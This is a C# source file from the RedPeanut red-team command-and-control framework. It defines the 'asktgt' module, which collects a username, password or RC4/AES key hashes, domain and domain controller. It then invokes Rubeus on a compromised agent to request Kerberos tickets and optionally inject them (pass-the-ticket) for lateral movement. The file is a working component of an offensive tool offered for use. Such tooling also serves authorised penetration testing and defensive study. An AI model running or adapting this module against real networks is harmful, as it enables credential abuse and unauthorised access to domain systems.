//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.Collections.Generic;
using System.Linq;
using static RedPeanut.Utility;

namespace RedPeanut
{
    class RubeusAskTgtManager : IMenu
    {
        public static Dictionary<string, string> mainmenu = new Dictionary<string, string>
        {
            { "set user", "Set user" },
            { "set password", "Set password" },
            { "set enctype", "Set enctype DES|RC4|AES128|AES256" },
            { "set des", "Set des" },
            { "set rc4", "Set rc4" },
            { "set aes128", "Set aes128" },
            { "set aes256", "Set aes256" },
            { "set domain", "Set domain" },
            { "set dc", "Set set domain controller" },
            { "set ptt", "Set ptt flag" },
            { "set luid", "Set luid flag" },
            { "set createnetonly", "Set binary to run" },
            { "set show", "Set show flag" },
            { "set ticket", "Set kirbi file or base64 rep" },
            { "set service", "Set service SPN" },
            { "run", "Execute module" },
            { "options", "Print current config" },
            { "info", "Print help" },
            { "back", "Back to lateral menu" }
        };

        public void RePrintCLI()
        {
            Utility.RePrintCLI(agent, modulename);
            return;
        }

        IAgentInstance agent = null;
        string modulename = "asktgt";
        string user;
        string password;
        string enctype;
        string des;
        string rc4;
        string aes128;
        string aes256;
        string domain;
        string dc;
        bool ptt;
        bool luid;
        string createnetonly;
        bool show;
        string ticket;
        string service;


        public RubeusAskTgtManager()
        {

        }

        public RubeusAskTgtManager(IAgentInstance agent)
        {
            this.agent = agent;
        }

        public void Execute()
        {
            string input;
            SetAutoCompletionHandler(mainmenu);
            do
            {
                input = RedPeanutCLI(agent, modulename);
                RubeusAskTgtMenu(input);
            } while (input != "back");
        }

        private void RubeusAskTgtMenu(string input)
        {
            string[] a_input = input.Split(' ');
            string f_input = ParseSelection(input);

            if (!string.IsNullOrEmpty(input))
            {
                if (mainmenu.ContainsKey(f_input.TrimEnd()))
                {
                    switch (f_input.TrimEnd())
                    {
                        case "set user":
                            user = GetParsedSetString(input);
                            break;
                        case "set password":
                            password = GetParsedSetString(input);
                            break;
                        case "set enctype":
                            enctype = GetParsedSetString(input);
                            break;
                        case "set des":
                            des = GetParsedSetString(input);
                            break;
                        case "set rc4":
                            rc4 = GetParsedSetString(input);
                            break;
                        case "set aes128":
                            aes128 = GetParsedSetString(input);
                            break;
                        case "set aes256":
                            aes256 = GetParsedSetString(input);
                            break;
                        case "set domain":
                            domain = GetParsedSetString(input);
                            break;
                        case "set dc":
                            dc = GetParsedSetString(input);
                            break;
                        case "set ptt":
                            ptt = GetParsedSetBool(input);
                            break;
                        case "set luid":
                            luid = GetParsedSetBool(input);
                            break;
                        case "set createnetonly":
                            createnetonly = GetParsedSetString(input);
                            break;
                        case "set show":
                            show = GetParsedSetBool(input);
                            break;
                        case "set ticket":
                            ticket = GetParsedSetString(input);
                            break;
                        case "set service":
                            service = GetParsedSetString(input);
                            break;
                        case "run":
                            Run();
                            break;
                        case "options":
                            PrintCurrentConfig();
                            break;
                        case "info":
                            PrintOptions("info", mainmenu);
                            break;
                        case "back":
                            Program.GetMenuStack().Pop();
                            return;
                        default:
                            Console.WriteLine("We had a woodoo");
                            break;
                    }
                }
                else
                {
                    PrintOptions("Command not found", mainmenu);
                }
            }
        }

        private void Run()
        {
            List<string> args = new List<string>();
            args.Add("asktgt");

            if (!string.IsNullOrEmpty(user))
            {
                args.Add("/user:" + user);
            }

            if (!string.IsNullOrEmpty(password))
            {
                args.Add("/password:" + password);
            }

            if (!string.IsNullOrEmpty(enctype))
            {
                args.Add("/enctype:" + enctype);
            }

            if (!string.IsNullOrEmpty(des))
            {
                args.Add("/des:" + des);
            }

            if (!string.IsNullOrEmpty(rc4))
            {
                args.Add("/rc4:" + rc4);
            }

            if (!string.IsNullOrEmpty(aes128))
            {
                args.Add("/aes128:" + aes128);
            }

            if (!string.IsNullOrEmpty(aes256))
            {
                args.Add("/aes256:" + aes256);
            }

            if (!string.IsNullOrEmpty(domain))
            {
                args.Add("/domain:" + domain);
            }

            if (!string.IsNullOrEmpty(dc))
            {
                args.Add("/dc:" + dc);
            }

            if (ptt)
            {
                args.Add("/ptt");
            }

            if (luid)
            {
                args.Add("/luid");
            }

            if (!string.IsNullOrEmpty(createnetonly))
            {
                args.Add("/createnetonly:" + createnetonly);
            }

            if (show)
            {
                args.Add("/show");
            }

            if (!string.IsNullOrEmpty(ticket))
            {
                args.Add("/ticket:" + ticket);
            }

            if (!string.IsNullOrEmpty(service))
            {
                args.Add("/service:" + service);
            }

            RunAssembly(PL_MODULE_RUBEUS, "Rubeus.Program", args.ToArray<string>(), agent);

        }

        private void PrintCurrentConfig()
        {
            Dictionary<string, string> properties = new Dictionary<string, string>
            {
                { "user", user },
                { "password", password },
                { "enctype", enctype },
                { "des", des },
                { "rc4", rc4 },
                { "aes128", aes128 },
                { "aes256", aes256 },
                { "domain", domain },
                { "dc", dc },
                { "ptt", ptt.ToString() },
                { "luid", luid.ToString() },
                { "createnetonly", createnetonly },
                { "show", show.ToString() },
                { "ticket", ticket },
                { "service", service }
            };

            Utility.PrintCurrentConfig(modulename, properties);
        }
    }
}

